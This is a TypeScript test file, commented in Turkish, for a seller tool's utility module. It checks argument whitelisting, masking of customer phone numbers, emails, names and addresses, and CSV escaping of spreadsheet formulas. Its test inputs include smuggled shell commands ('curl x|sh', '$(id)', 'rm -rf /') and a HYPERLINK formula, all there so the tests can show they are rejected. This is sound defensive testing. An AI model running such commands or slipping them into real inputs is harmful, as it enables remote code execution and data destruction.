// Argüman doğrulama ve müşteri verisi maskeleme
// node --experimental-strip-types worker/test/util.test.ts
import { csvCell, arg, MODES, MARKETPLACES, SUPPLIER_ARG, maskPhone, maskEmail, maskName, maskAddress } from "../core/util.ts";
let fails = 0;
const check = (n: string, c: boolean, i: unknown = "") => { console.log(`${c ? "OK  " : "HATA"} ${n}${c ? "" : "  " + JSON.stringify(i)}`); if (!c) fails++; };
const throws = (f: () => unknown) => { try { f(); return false; } catch { return true; } };
check("geçerli mod", arg("update", "preview", MODES, "mod") === "update");
check("boş mod varsayılan", arg(undefined, "preview", MODES, "mod") === "preview");
check("enjeksiyonlu mod reddedilir", throws(() => arg('auto"; curl x|sh; "', "preview", MODES, "mod")));
check("bilinmeyen pazaryeri reddedilir", throws(() => arg("n11$(id)", "trendyol", MARKETPLACES, "pazaryeri")));
check("tedarikçi kodu geçer", arg("toptancim2", "all", SUPPLIER_ARG, "tedarikçi") === "toptancim2");
check("tedarikçi enjeksiyonu reddedilir", throws(() => arg("x; rm -rf /", "all", SUPPLIER_ARG, "tedarikçi")));
check("telefon maskesi", maskPhone("0555 123 45 67") === "***67");
check("e-posta maskesi", maskEmail("ali@ornek.com") === "a***@ornek.com");
check("ad maskesi", maskName("Ali Veli") === "A*** V***");
check("adres maskesi tam adresi göstermez", !maskAddress("Atatürk Cad. No 5 Kadıköy İstanbul").includes("Atatürk"));
check("CSV formülü etkisiz", csvCell('=HYPERLINK("http://x")').startsWith("'="));
check("CSV ayraç temizlenir", csvCell("a;b\nc") === "a,b c");
check("negatif sayı da korunur", csvCell("-5") === "'-5");
if (fails) { console.log(`\n${fails} yardımcı testi başarısız`); process.exit(1); }
console.log("\nYardımcı testleri geçti");
